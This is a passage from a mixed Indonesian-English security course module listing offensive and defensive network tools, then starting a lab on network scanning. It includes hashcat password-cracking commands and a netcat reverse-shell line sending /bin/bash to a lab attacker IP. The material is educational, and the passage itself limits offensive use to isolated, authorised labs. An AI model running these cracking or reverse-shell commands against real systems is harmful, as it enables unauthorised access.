  - Testing bcrypt/scrypt hashes (slower algorithms)
  - Mask attacks untuk predictable password patterns
  - Dictionary attacks pada various hash formats
  
- **Installation**: `sudo apt install hashcat`
- **Commands**:
  ```bash
  hashcat -m 0 hashes.txt wordlist.txt        # MD5 cracking (-m 0)
  hashcat -m 1000 hashes.txt wordlist.txt     # NTLM cracking (-m 1000)
  hashcat -m 3200 hashes.txt wordlist.txt     # bcrypt cracking (-m 3200)
  hashcat -m 0 -a 3 hashes.txt ?a?a?a?a       # Brute force (?a = semua chars)
  ```
- Modes: Dictionary (-a 0), combo (-a 1), mask (-a 3), hybrid (-a 6/-a 7)
- Performance: 100x+ lebih cepat dari CPU-based methods (dengan GPU)
- Mitigasi: Same as John the Ripper - strong hashing, salting, slow algorithms

#### 6. NETWORK DISCOVERY & VALIDATION TOOLS

**A. ARP Scan (arp-scan) - Local Network Discovery**
- **Fungsi Utama**: Discover active hosts pada local network via ARP protocol
- **Digunakan Untuk**:
  - Quick host discovery di local network (faster & more reliable than ping)
  - Identify IP address assignments dan active devices
  - Detect ARP spoofing atau suspicious ARP activities
  - Network mapping untuk local segment
  - Find unauthorized devices connected ke network
  
- **Installation**: `sudo apt install arp-scan`
- **Commands**:
  ```bash
  sudo arp-scan -l                          # Scan local network
  sudo arp-scan -I eth0 192.168.56.0/24    # Scan specific subnet on interface
  sudo arp-scan -v 192.168.56.0/24          # Verbose output
  sudo arp-scan --localnet                  # Auto-scan local network
  ```
- Output: IP address, MAC address, device manufacturer
- Teknik: Layer 2 discovery (tidak easily detected seperti ping scans)

**B. Nping - Network Packet Probe**
- **Fungsi Utama**: Advanced packet crafting & network probing tool
- **Digunakan Untuk**:
  - Custom packet crafting untuk ping echo requests
  - TCP/UDP port connectivity testing (alternative to telnet)
  - Network latency measurement
  - Testing firewall rules & network behavior
  - Identifying packet filtering policies
  - Crafting custom headers untuk bypass filters
  
- **Installation**: `sudo apt install nmap` (includes nping)
- **Commands**:
  ```bash
  nping 192.168.56.101                      # Simple ICMP echo
  nping -tcp 192.168.56.101 -p 80           # TCP ping to port 80
  nping -udp 192.168.56.101 -p 53           # UDP ping to port 53
  nping --tcp-flags SYN 192.168.56.101      # Custom TCP SYN flag
  nping -HH 192.168.56.101 -p 443           # Show hex output
  ```

**C. Telnet - Basic Network Connectivity Testing**
- **Fungsi Utama**: Terminal emulation & port connectivity testing
- **Digunakan Untuk**:
  - Simple port connectivity check (telnet host:port)
  - Testing if service adalah open & responding
  - Plaintext protocol testing (HTTP, SMTP, POP3, etc)
  - Manual banner grabbing dari services
  - Debugging network connectivity issues
  - Testing firewall rules
  
- **Installation**: `sudo apt install telnet`
- **Commands**:
  ```bash
  telnet 192.168.56.101 80                  # Test HTTP port
  telnet 192.168.56.101 443                 # Test HTTPS port
  telnet 192.168.56.101 22                  # Test SSH port
  telnet smtp.example.com 25                # Test SMTP
  telnet pop3.example.com 110               # Test POP3
  ```
- Usage: Type commands directly (HTTP: GET / HTTP/1.1)
- Caution: Unencrypted protocol, avoid for sensitive operations

**D. Netcat (nc) - Network Swiss Army Knife**
- **Fungsi Utama**: Network data transmission, port scanning, reverse shells
- **Digunakan Untuk**:
  - Port scanning (simpler alternative to nmap -p-)
  - Banner grabbing dari services
  - File transfer antara systems
  - Port forwarding & tunneling
  - Creating reverse shells untuk post-exploitation
  - Testing network connectivity
  - Server/client communication testing
  
- **Installation**: `sudo apt install netcat-openbsd` atau `netcat-traditional`
- **Commands**:
  ```bash
  nc -zv 192.168.56.101 1-1000              # Port scan range
  nc -zv 192.168.56.101 80,443,22           # Scan specific ports
  nc 192.168.56.101 80                      # Connect ke service
  nc -l -p 4444                             # Listen mode (server)
  nc 192.168.56.101 4444 < file.txt         # Send file
  nc -l -p 4444 > received.txt              # Receive file
  nc -e /bin/bash 192.168.56.100 4444       # Reverse shell to attacker
  ```

**E. Tracert/Traceroute - Route Path Visualization**
- **Fungsi Utama**: Trace network path dari source ke destination
- **Digunakan Untuk**:
  - Identify routing path untuk target system
  - Find intermediate routers pada path
  - Identify firewalls blocking certain hops
  - Detect network latency points
  - Troubleshoot network connectivity issues
  - Mapping network infrastructure
  
- **Installation**: 
  - Windows: `tracert` (built-in)
  - Linux: `sudo apt install traceroute`
  
- **Commands**:
  ```bash
  traceroute 192.168.56.101                 # Linux version
  traceroute -m 30 192.168.56.101           # Max 30 hops
  traceroute -p 80 192.168.56.101           # Use port 80 instead ICMP
  tracert 192.168.56.101                    # Windows version
  tracert -h 30 192.168.56.101              # Windows max hops
  ```
- Output: Hop number, router IP, round-trip times
- TTL (Time To Live): Decreased pada setiap hop untuk identify intermediate systems

#### 7. LINUX NETWORK COMMANDS & UTILITIES

**A. IP Address & Interface Management**
- **Commands**:
  ```bash
  ip addr show                              # Display all interfaces & IP addresses
  ip addr add 192.168.56.50/24 dev eth0    # Assign IP address
  ip addr del 192.168.56.50/24 dev eth0    # Remove IP address
  ip link show                              # Display link layer info
  ip link set eth0 up                       # Enable interface
  ip link set eth0 down                     # Disable interface
  ifconfig                                  # Legacy interface info (deprecated)
  ifconfig eth0 192.168.56.100              # Set IP (legacy)
  ```
- **Digunakan Untuk**: Interface configuration, IP management, network setup

**B. Routing & Gateway Configuration**
- **Commands**:
  ```bash
  ip route show                             # Display routing table
  ip route add 10.0.0.0/24 via 192.168.56.1 # Add route
  ip route del 10.0.0.0/24                  # Delete route
  ip route add default via 192.168.56.1     # Set default gateway
  route                                     # Display routing table (legacy)
  route add default gw 192.168.56.1         # Set gateway (legacy)
  netstat -r                                # Show routing table via netstat
  ```
- **Digunakan Untuk**: Routing configuration, gateway setup, network path definition

**C. DNS Resolution & Configuration**
- **Commands**:
  ```bash
  nslookup google.com                       # Query DNS server
  nslookup -type=MX google.com              # Query MX records
  dig google.com                            # Detailed DNS query
  dig google.com +short                     # Short DNS query output
  dig google.com @8.8.8.8                   # Query specific DNS server
  host google.com                           # Simple hostname resolution
  hostname                                  # Display/set system hostname
  hostname -I                               # Display all IP addresses
  cat /etc/resolv.conf                      # Display DNS servers config
  ```
- **Digunakan Untuk**: DNS testing, domain resolution, DNS reconnaissance

**D. Network Statistics & Connection Analysis**
- **Commands**:
  ```bash
  netstat -an                               # Show all connections (numeric)
  netstat -antp                             # Show connections with process names
  netstat -i                                # Display interface statistics
  netstat -r                                # Display routing table
  netstat -s                                # Display protocol statistics
  ss -antp                                  # Modern alternative (socket statistics)
  ss -tunap                                 # Show all listening ports
  lsof -i                                   # List open files & network connections
  ```
- **Digunakan Untuk**: Connection monitoring, port audit, process tracking

**E. Packet Capture & Analysis**
- **Commands**:
  ```bash
  tcpdump -i eth0                           # Capture on interface
  tcpdump -i eth0 tcp port 80               # Capture HTTP traffic
  tcpdump -i eth0 -w capture.pcap           # Write to file
  tcpdump -i eth0 -r capture.pcap           # Read from file
  tcpdump -i eth0 -n 'tcp port 22'         # No DNS resolution
  tcpdump -i any                            # Capture all interfaces
  tshark -i eth0                            # Wireshark CLI version
  tshark -r capture.pcap -Y http            # Filter display
  ```
- **Digunakan Untuk**: Network traffic analysis, packet inspection, monitoring

**F. Firewall & Netfilter Management**
- **Commands**:
  ```bash
  sudo iptables -L                          # List firewall rules
  sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
  sudo ufw status                           # UFW firewall status
  sudo ufw allow 22/tcp                     # Allow SSH
  sudo firewall-cmd --list-all              # Firewalld status
  ```
- **Digunakan Untuk**: Firewall rule management, packet filtering

**G. Bandwidth & Performance Monitoring**
- **Commands**:
  ```bash
  ifstat                                    # Interface statistics
  nethogs                                   # Per-process bandwidth usage
  iftop                                     # Real-time bandwidth by host
  mtr 192.168.56.101                        # Combined traceroute + ping
  ping -c 4 192.168.56.101                  # Ping with count
  speedtest-cli                             # Internet speed test
  ```
- **Digunakan Untuk**: Network performance analysis, bandwidth monitoring

**H. Network Service Testing & Probing**
- **Commands**:
  ```bash
  curl http://192.168.56.101                # HTTP request & content download
  curl -I http://192.168.56.101             # HTTP headers only
  wget http://192.168.56.101/file.txt       # Download file
  whois 192.168.56.101                      # WHOIS database lookup
  ping -c 1 192.168.56.101                  # ICMP echo test
  fping 192.168.56.0/24                     # Parallel ping sweep
  arping 192.168.56.101                     # ARP-based ping
  ```
- **Digunakan Untuk**: Service testing, connectivity validation, resource download

---

### BAGIAN 2: DEFENSIVE TOOLS & TECHNIQUES (BLUE TEAM)

Defensive tools untuk protection, detection, dan response terhadap network attacks.

#### 1. FIREWALL & BOUNDARY PROTECTION

**A. UFW (Uncomplicated Firewall) - Linux Host Firewall**
- **Fungsi Utama**: Simplified interface untuk iptables firewall management
- **Digunakan Untuk**:
  - Basic host firewall protection di Linux servers
  - Whitelist-based access control (default deny)
  - Port-based filtering untuk services
  - IP-based access restrictions
  - Simple rule management via CLI
  - Logging untuk audit trail
  
- **Installation**: `sudo apt install ufw`
- **Commands**:
  ```bash
  sudo ufw enable                         # Enable firewall
  sudo ufw disable                        # Disable firewall
  sudo ufw default deny incoming          # Block all inbound by default
  sudo ufw default allow outbound         # Allow all outbound
  sudo ufw allow 22/tcp                   # Allow SSH
  sudo ufw allow 80/tcp                   # Allow HTTP
  sudo ufw allow 443/tcp                  # Allow HTTPS
  sudo ufw allow from 192.168.56.100 to any port 22  # Allow SSH from specific IP
  sudo ufw deny from 192.168.56.100       # Block entire IP
  sudo ufw status verbose                 # Show all active rules
  sudo ufw show added                     # Show commands that added rules
  sudo ufw delete allow 80/tcp             # Remove rule
  sudo ufw reset                          # Reset to defaults (careful!)
  ```
- Rules: Stateful inspection, connection tracking, allow/deny based on protocol & port
- Logging: `sudo ufw logging on` → check `/var/log/ufw.log`
- Teknik: Whitelist approach (deny by default, allow necessary), principle of least privilege
- Impact: Blocks port scanning results (filtered status), prevents unauthorized access

**B. iptables/netfilter - Advanced Linux Kernel Firewall**
- **Fungsi Utama**: Low-level packet filtering, Network Address Translation (NAT), load balancing
- **Digunakan Untuk**:
  - Advanced packet filtering pada Linux kernel level
  - Network Address Translation (NAT) untuk hide internal networks
  - Port forwarding untuk redirect traffic
  - Anti-DDoS rate limiting & traffic shaping
  - Complex rule chains untuk sophisticated filtering
  - Connection tracking untuk stateful inspection
  - Masquerade untuk hide source IP
  
- **Commands**:
  ```bash
  sudo iptables -L -n                     # List rules
  sudo iptables -A INPUT -i eth1 -p tcp --dport 22 -j ACCEPT  # Allow SSH
  sudo iptables -A INPUT -p tcp --dport 22 -j DROP # Deny SSH
  sudo iptables -D INPUT 1                # Delete rule 1
  sudo iptables -F                        # Flush all rules
  sudo iptables -P INPUT DROP             # Set default policy to DROP
  sudo iptables -t nat -L                 # List NAT rules
  sudo iptables-save > firewall.backup    # Save rules
  sudo iptables-restore < firewall.backup # Restore rules
  ```
- Chains: INPUT (incoming), OUTPUT (outgoing), FORWARD (routing/NAT)
- Targets: ACCEPT, DROP, REJECT, LOG
- Teknik: Connection tracking, stateful inspection, anti-DDoS rate limiting
  ```bash
  sudo iptables -A INPUT -p tcp -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
  # Rate limit ke 25 packets/minute, burst ke 100
  ```

**C. pfSense - Open-source Enterprise-grade Firewall/Router**
- **Fungsi Utama**: Full-featured firewall dengan routing, VPN, IDS/IPS integration
- **Digunakan Untuk**:
  - Network perimeter protection untuk organizations
  - VPN gateway untuk remote access
  - Stateful firewall rules dengan GUI management
  - Traffic shaping untuk bandwidth management
  - NAT & port forwarding untuk network translation
  - IDS/IPS integration (Snort/Suricata)
  - DHCP/DNS services
  - Geographic blocking & advanced filtering
  
- **Installation**: Download .iso, install sebagai VM atau hardware fisik
- **Features**: Stateful firewall rules (GUI-based), NAT, DHCP, DNS, VPN (OpenVPN/IPSec), IDS/IPS (Snort/Suricata), Captive portal
- **Configuration**: Web GUI (https://pfsense-ip)
- **Teknik**: Advanced filtering, application-layer detection, geographic blocking, traffic shaping

**D. Cisco ASA - Enterprise Hardware Firewall**
- **Fungsi Utama**: High-performance enterprise firewall dengan advanced threat protection
- **Digunakan Untuk**:
  - Enterprise network edge protection
  - High-throughput traffic inspection
  - Advanced threat prevention (AV, IPS, URL filtering)
  - VPN termination untuk thousands of connections
  - Multi-context virtualization untuk multiple security domains
  - Application protocol inspection & control
  - Failover & redundancy untuk high availability
  
- **CLI Commands**:
  ```bash
  show running-config                     # Display configuration
  show interface ip brief                 # Show interface status
  show access-list                        # List ACLs (access control lists)
  show nat                                # Display NAT rules
  show connections                        # Active connections
  ```
- Features: Stateful inspection, application protocol inspection, threat defense, encryption
- Licensing: Requires valid license untuk advanced features (IPS, AV, Webfilter)

**E. Fortigate - Next-Generation Enterprise Firewall**
- **Fungsi Utama**: Advanced threat protection dengan AI/ML-based detection
- **Digunakan Untuk**:
  - Enterprise edge firewall dengan high-performance throughput
  - Advanced threat protection (malware, C2, zero-day detection)
  - SSL/TLS inspection untuk encrypted traffic visibility
  - Web filtering & URL categorization
  - Application-layer detection & control (AppID)
  - DLP (Data Loss Prevention) untuk prevent data exfiltration
  - Sandboxing untuk unknown malware detection
  - High-availability & load balancing
  
- **Features**: FortiOS operating system, NGFW capabilities, threat intelligence
- **Dashboard**: Web-based management GUI dengan rich reporting
- **Deployment**: Hardware appliances atau virtual appliances (FortiVM)

**F. firewalld - Modern Linux Firewall Manager**
- **Fungsi Utama**: Dynamic firewall management untuk modern Linux systems
- **Digunakan Untuk**:
  - Next-generation host firewall untuk RHEL/CentOS/Fedora
  - Zone-based filtering (public, private, trusted, etc)
  - Dynamic rule updates tanpa service restart
  - Simple CLI & GUI management
  - Service-based rule definition
  - Rich rule syntax untuk complex filtering
  - Integration dengan systemd
  
- **Installation**: `sudo apt install firewalld` atau pre-installed
- **Commands**:
  ```bash
  sudo firewall-cmd --get-zones               # List zones
  sudo firewall-cmd --get-active-zones        # Active zones
  sudo firewall-cmd --zone=public --add-service=http
  sudo firewall-cmd --zone=public --add-port=8080/tcp
  sudo firewall-cmd --zone=public --remove-port=8080/tcp
  sudo firewall-cmd --zone=internal --add-source=192.168.56.0/24
  sudo firewall-cmd --runtime-to-permanent    # Make changes permanent
  sudo firewall-cmd --reload                  # Reload config
  ```

**G. CSF (ConfigServer Security Firewall) - Server Firewall**
- **Fungsi Utama**: Combined firewall, IDS, and process killer untuk Linux servers
- **Digunakan Untuk**:
  - Server-level firewall protection
  - Port-state inspection & DDoS detection
  - Process-based firewall (kill malicious processes)
  - Intrusion detection via log analysis
  - Brute-force attack detection (SSH, FTP)
  - Account limit monitoring
  - Testing for rootkits & exploits
  
- **Installation**: Download dari ConfigServer website
- **Configuration**: `/etc/csf/csf.conf`
- **Commands**:
  ```bash
  csf -s                                      # Start firewall
  csf -f                                      # Stop firewall
  csf -r                                      # Restart firewall
  csf -l                                      # List rules
  csf -a IP                                   # Add IP to whitelist
  csf -d IP                                   # Remove IP from whitelist
  ```

**H. Cloudflare Zerotrust (formerly Cloudflare Access) - Cloud Firewall**
- **Fungsi Utama**: Cloud-based Zero Trust network access & DDoS protection
- **Digunakan Untuk**:
  - Cloud-native firewall untuk organizations
  - Zero Trust policy enforcement (verify every access)
  - Prevent DDoS attacks di edge
  - Bot detection & mitigation
  - WAF (Web Application Firewall) rules
  - API protection
  - Log & analytics untuk security monitoring
  - Protection tanpa VPN
  
- **Features**: 
  - Cloudflare Tunnel untuk secure connections
  - Gateway (DNS-level filtering)
  - Rules engine untuk custom policies
  - Real-time threat data feeds
  
- **Deployment**: Cloud-based (no hardware), DNS-based filtering, agent-based access

**I. Router Built-in Firewall - Network Edge Protection**
- **Fungsi Utama**: Basic firewall pada network router
- **Digunakan Untuk**:
  - Basic network perimeter protection (first line of defense)
  - Prevent direct internet exposure dari internal devices
  - Simple port forwarding & NAT
  - Basic DoS protection
  - Stateful packet filtering
  
- **Common Router Firewalls**:
  - **OpenWrt**: Open-source router firmware
    ```bash
    uci show firewall                        # Show firewall config
    uci set firewall.@zone[0].input='ACCEPT'
    uci commit firewall
    /etc/init.d/firewall restart
    ```
  
  - **DD-WRT**: Consumer router firmware
    - Web GUI management
    - Basic firewall rules
    - Port forwarding
  
  - **Cisco/Juniper/Arista**: Enterprise router firewalls
    - Advanced routing + firewall
    - ACLs (Access Control Lists)
    - Rate limiting & traffic shaping
  
- **Configuration**: Usually via web GUI (192.168.1.1 atau 192.168.0.1)
- **Typical Rules**:
  - Block all inbound by default
  - Allow only necessary services
  - Port forwarding untuk specific servers
  - DMZ (Demilitarized Zone) untuk web servers

---

#### 2. INTRUSION DETECTION & PREVENTION SYSTEMS (IDS/IPS)

**A. Snort - Network-based IDS/IPS**
- **Fungsi Utama**: Real-time traffic analysis, intrusion detection & prevention
- **Digunakan Untuk**:
  - Network perimeter intrusion detection
  - Malware detection via signature matching
  - Exploit detection untuk prevent zero-day attacks
  - DDoS detection & blocking
  - Anomaly-based alerts
  - Protocol violation detection
  
- **Installation**: `sudo apt install snort`
- **Commands**:
  ```bash
  sudo snort -d -l /var/log/snort -c /etc/snort/snort.conf -i eth1
  # -d: dump traffic, -l: log directory, -c: config file, -i: interface
  
  sudo snort -c /etc/snort/snort.conf -i eth1 -A console  # Console alerts
  ```
- Operation modes: NIDS (network IDS, promiscuous), HIDS (host-based)
- Teknik: Signature-based detection, pattern matching, protocol analysis, anomaly alerting
- Alert output: .log files, database (MySQL), syslog integration

**B. Suricata - Modern Multi-threaded IDS/IPS**
- **Fungsi Utama**: Next-generation IDS/IPS dengan Lua scripting support
- **Digunakan Untuk**:
  - High-performance network intrusion detection
  - File extraction dari network traffic untuk malware analysis
  - Application-layer detection (HTTP, TLS protocols)
  - JSON-based logging untuk integration dengan SIEM
  - Custom rule development dengan Suricata syntax
  - HTTP/2 & modern protocol support
  - Threat hunting & investigation
  
- **Installation**: `sudo apt install suricata`
- **Commands**:
  ```bash
  sudo suricata -c /etc/suricata/suricata.yaml -i eth1
  sudo suricata -c /etc/suricata/suricata.yaml -r capture.pcap  # File mode
  tail -f /var/log/suricata/fast.log                            # View alerts
  ```
- Features: HTTP/2 support, TLS/SSL parsing, file extraction, JSON output
- Teknik: Thread-per-flow model, high performance, flexible rule syntax (Suricata format)

**C. Zeek (formerly Bro) - Network Analysis & Behavioral Framework**
- **Fungsi Utama**: Deep network analysis, behavioral analysis, protocol understanding
- **Digunakan Untuk**:
  - Network traffic analysis untuk security monitoring
  - Behavioral analysis untuk detect anomalous network patterns
  - Connection tracking & session analysis
  - Protocol-level understanding untuk identify suspicious behavior
  - Malware detection based on network behavior
  - Forensics & investigation dengan detailed logs
  - Integration dengan threat intelligence feeds
  
- **Installation**: `sudo apt install zeek`
- **Commands**:
  ```bash
  zeek -r capture.pcap                    # Analyze pcap file
  zeek -i eth1 local                      # Live network monitoring
  tail -f zeek/conn.log                   # Connection log
  cat zeek/http.log                       # HTTP requests
  ```
- Output logs: conn.log, http.log, dns.log, ssl.log, file.log, notice.log
- Teknik: Connection analysis, protocol parsing, behavioral anomaly detection

**D. ModSecurity - Web Application Firewall (WAF)**
- Fungsi: Protect web applications dari common web attacks
- Installation: `sudo apt install libapache2-mod-security2`
- Features: SQL injection prevention, XSS protection, malware detection, OWASP CRS rules
- Teknik: Request/response filtering, pattern matching, behavioral rules
- Detection modes: Block (default) or alert-only

#### 3. HOST-BASED PROTECTION & MONITORING

**A. auditd - Linux Audit Framework**
- Fungsi: System call logging & monitoring untuk compliance dan forensics
- Installation: `sudo apt install auditd`
- Commands:
  ```bash
  sudo service auditd start                # Start audit daemon
  sudo auditctl -l                         # List active rules
  sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_tracking
  # Track semua execve (command execution)
  
  sudo auditctl -a always,exit -F arch=b64 -S openat -F dir=/etc/ -k etc_changes
  # Track changes di /etc/
  
  sudo tail -f /var/log/audit/audit.log    # View audit log
  ausearch -k exec_tracking                # Search by key
  ```
- Teknik: Process tracking, file integrity monitoring, compliance audit trail

**B. AIDE (Advanced Intrusion Detection Environment)**
- Fungsi: File integrity monitoring untuk detect unauthorized modifications
- Installation: `sudo apt install aide aide-common`
- Commands:
  ```bash
  sudo aideinit                            # Initialize database
  sudo aide --config=/etc/aide/aide.conf --check  # Check untuk changes
  sudo aide --config=/etc/aide/aide.conf --update # Update setelah changes
  ```
- Monitors: File permissions, ownership, timestamps, checksums (MD5, SHA256)
- Teknik: Detect unauthorized modifications, rootkit installation, tampering

**C. OSSEC - Host-based IDS**
- Fungsi: File integrity monitoring, log analysis, rootkit detection
- Installation: `sudo apt install ossec-hids`
- Commands:
  ```bash
  sudo /var/ossec/bin/wazuh-control start  # Start OSSEC
  sudo tail -f /var/ossec/logs/alerts/alerts.log  # View alerts
  ```
- Alerts: Possible rootkit detected, file modified, suspicious process, brute force
- Teknik: Multi-layer detection, log-based anomaly detection

**D. Tripwire - Enterprise File Integrity Monitoring**
- Fungsi: Enterprise-grade file integrity monitoring dengan centralized management
- Features: Real-time alerts, signed database (tamper-proof), compliance support
- Use case: Compliance (PCI-DSS, HIPAA) file integrity requirements

#### 4. ENDPOINT PROTECTION

**A. ClamAV - Antivirus Engine**
- Fungsi: Malware detection & removal
- Installation: `sudo apt install clamav clamav-daemon`
- Commands:
  ```bash
  sudo freshclam                           # Update virus definitions
  sudo clamscan /var/www/html/ -r         # Recursive scan
  sudo clamscan --remove /var/www/html/ -r # Remove detected malware
  sudo clamscan --heuristic-scan-options=Plus /var/www/html/  # Advanced heuristics
  ```
- Teknik: Signature-based detection, heuristic analysis, archive scanning

**B. Wazuh - Unified Security Platform (HIDS + SIEM)**
- Fungsi: Agent-based HIDS dengan centralized SIEM capabilities
- Installation: `sudo apt install wazuh-agent`
- Commands:
  ```bash
  sudo /var/ossec/bin/wazuh-control start  # Start agent
  sudo tail -f /var/ossec/logs/alerts/alerts.log  # View alerts
  ```
- Teknik: Centralized monitoring, file integrity, log analysis, CVE checking, rootkit detection
- Dashboard: Web-based UI untuk visualization & analysis

**C. Osquery - OS Instrumentation & Asset Inventory**
- Fungsi: Query OS like database, asset inventory, behavioral baselining
- Installation: `sudo apt install osquery`
- Commands:
  ```bash
  osqueryi                                # Interactive shell
  > SELECT * FROM processes;              # List all processes
  > SELECT * FROM open_sockets;           # Network connections
  > SELECT * FROM file WHERE path LIKE '/root/.ssh/%';  # SSH keys
  > SELECT * FROM users;                  # User accounts
  > SELECT * FROM installed_packages;     # Installed software
  ```
- Teknik: Behavioral baseline, anomaly detection (unexpected process, new user, suspicious listening port)

#### 5. LOG AGGREGATION & SIEM

**A. ELK Stack (Elasticsearch, Logstash, Kibana)**
- Fungsi: Open-source log aggregation & analytics platform
- Installation:
  ```bash
  sudo apt install elasticsearch logstash kibana
  ```
- Architecture: Beats (collectors) → Logstash (processing) → Elasticsearch (storage) → Kibana (visualization)
- Dashboards: SSH brute force attempts, firewall denials, application errors, suspicious behavior
- Alerts: Email/Slack notifications untuk suspicious patterns
- Teknik: Correlation (find related events), trend analysis, threat hunting

**B. Splunk - Enterprise SIEM**
- Fungsi: Enterprise log management & security analytics platform
- Features: Ingestion (any data format), parsing, indexing, searching, advanced analytics
- Dashboards: Pre-built (security, compliance, IT operations)
- Alerting: Real-time alerts untuk security events, automated response
- Teknik: Machine learning untuk anomaly detection, user behavior analytics (UBA)

**C. Graylog - Open-source SIEM**
- Fungsi: Log management dengan alerts & dashboards
- Installation: Docker-based atau standalone
- Features: Log parsing, search, dashboard creation, alerting, content packs
- Teknik: Message processing pipelines, content packs untuk security use cases

#### 6. NETWORK MONITORING & ANALYSIS

**A. NetFlow/sFlow Analysis (ntopng)**
- Fungsi: Analyze traffic flows (not full packets) untuk network monitoring
- Installation: `sudo apt install ntopng`
- Usage: `sudo ntopng -w 192.168.56.1` (listen on interface)
- Monitoring: Top talkers, protocols, geolocation, traffic trends
- Teknik: Baseline normal traffic, detect anomalies (unusual volume, new destinations)

**B. Capanalysis - Web-based Pcap Analyzer**
- Fungsi: Interactive pcap visualization & analysis
- Features: Packet flow visualization, conversation extraction, statistics
- Teknik: Post-incident analysis, network forensics, timeline reconstruction

**C. Arkime (Moloch) - Large-scale Packet Capture**
- Fungsi: Index & search full packet captures at scale untuk forensics
- Features: Fast search across months of PCAP, extraction of files/emails
- Teknik: Network forensics, compliance (data retention), incident investigation

---

### 3-LAYER DEFENSE STRATEGY (Blue Team Overview)

| Layer | Control | Implementation | Tools |
|-------|---------|-----------------|-------|
| **Prevention** | Encryption in Transit | HTTPS/TLS (Apache + mod_ssl) | openssl, certbot |
| **Prevention** | Authentication | SSH keys, 2FA, strong passwords | SSH, Duo, Authenticator |
| **Prevention** | Authorization | RBAC (role-based access control) | database users, sudoers |
| **Prevention** | Firewall Rules | Block by default, allow necessary | iptables, ufw, pfSense |
| **Prevention** | Network Segmentation | VLAN, host-only networks | switch, VM networking |
| **Detection** | Network IDS | Monitor port mirror / SPAN | Snort, Suricata, Zeek |
| **Detection** | Host IDS | Monitor system logs, file integrity | auditd, osquery, AIDE |
| **Detection** | SIEM | Aggregate & correlate logs | ELK, Splunk, Wazuh |
| **Detection** | ARP Inspection | Block suspicious ARP | switch DAI (Dynamic ARP Inspection) |
| **Response** | IP Blocking | Firewall rule add | iptables, ufw |
| **Response** | Isolation | Disconnect / VLAN move | ESXi vSwitch, switch port |
| **Recovery** | Patch & Harden | Update service, change config | apt upgrade, openssl config |

**Blue Team Actions (Lab Example):**
1. Monitor: `tail -f /var/log/auth.log` (watch failed login attempts)
2. Detect: ARP spoofing attempt → trigger alert via Snort signature
3. Block: `sudo ufw deny from 192.168.56.100` (block attacker IP)
4. Investigate: Capture traffic via Wireshark → extract evidence
5. Patch: `sudo apt upgrade apache2` (patch vulnerability)

---

**Etika Penggunaan Tools:** Semua tindakan offensive harus dilakukan di lingkungan lab terisolasi dengan izin tertulis dari pemilik sistem. JANGAN lakukan di production tanpa explicit permission dan documented business justification.

---

## 8. SESI PRAKTIK - Hands-On Security Lab

### 8.1 Praktik 1: Network Layer Scanning (OSI Layer 1-4)

#### **Tujuan:**
Mengidentifikasi terbuka port, services, dan OS pada target network di lingkungan sekitar.

#### **Tools yang Diperlukan:**
- **Nmap** - Port scanning & service detection
- **ARP-Scan** - ARP-based host discovery & MAC detection
- **Netdiscover** - Lightweight network discovery via ARP (active/passive)
- **Masscan** - Ultra-fast port scanner
- **Angry IP Scanner** - GUI-based network discovery & scanning
- **Wireshark** - Packet analysis
- **Netstat** - Connection monitoring
- **Advanced Nmap Scanning** - Subnet & advanced techniques

#### **Diagram Lab Setup:**
```
┌─────────────────────────────────────────────────────┐
│            NETWORK SCANNING LAB                     │
└─────────────────────────────────────────────────────┘

Student Laptop:
┌──────────────────────────────────────────┐
│  OS: Windows/Linux                       │
│  Tools:                                  │
│  • Nmap (Port Scanning)                  │
│  • Wireshark (Packet Capture)            │
│  • CMD/Terminal (Netstat, Tracert)       │
└──────────┬───────────────────────────────┘
           │
    ┌──────┴──────┬─────────────┬──────────┐
    │             │             │          │
    ↓             ↓             ↓          ↓
Network Targets (scan safe devices only):
├─ Router (192.168.1.1)
├─ Printer (192.168.1.100)
├─ Wi-Fi Access Point
├─ Other Lab Machines
└─ **NOT REAL TARGETS** (must have permission!)
```

#### **Praktik Step-by-Step:**

---

**STEP 1: Identifikasi Network Interface & Konfigurasi**

#### **1A. Windows - Gunakan ipconfig**
```cmd
# Command Prompt
ipconfig /all

OUTPUT EXAMPLE:
Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) Ethernet Connection (2) I219-V
   Physical Address. . . . . . . . . : 1A-2B-3C-4D-5E-6F
   DHCP Enabled. . . . . . . . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.1.50
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
   DHCP Server . . . . . . . . . . . : 192.168.1.1
   DNS Servers . . . . . . . . . . . : 8.8.8.8, 8.8.4.4

KEY INFORMATION EXTRACTED:
├─ Your IP: 192.168.1.50
├─ Subnet Mask: 255.255.255.0
├─ Gateway: 192.168.1.1 (Router)
├─ Network: 192.168.1.0/24
└─ Broadcast: 192.168.1.255
```

#### **1B. Linux/WSL - Gunakan ifconfig atau ip addr show**
```bash
# Method 1: ifconfig (legacy tapi mudah dibaca)
ifconfig

# Method 2: ip addr show (modern, recommended)
ip addr show

OUTPUT EXAMPLE (eth0 interface):
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.28.191.169  netmask 255.255.240.0  broadcast 172.28.191.255
        inet6 fe80::215:5dff:fec1:4894  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:c1:48:94  txqueuelen 1000  (Ethernet)
        RX packets 2536541  bytes 3585062025 (3.5 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1265117  bytes 81248788 (81.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

KEY INFORMATION EXTRACTED:
├─ Interface: eth0
├─ Your IP: 172.28.191.169
├─ Netmask: 255.255.240.0 (/20)
├─ Gateway: 172.28.176.1 (check dengan route -n)
├─ MAC Address: 00:15:5d:c1:48:94
└─ Calculate Network: 172.28.176.0/20

CALCULATE NETWORK RANGE:
netmask 255.255.240.0 = /20
network = 172.28.176.0 - 172.28.191.255 (4096 hosts)
```

#### **1C. Find Default Gateway (untuk menentukan target network)**
```bash
# Windows Command Prompt:
route print
# atau: ipconfig /all (lihat Default Gateway)

# Linux/WSL:
route -n
# atau: ip route show
# atau: netstat -rn

OUTPUT LINUX EXAMPLE:
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         172.28.176.1    0.0.0.0         UG    256    0        0 eth0
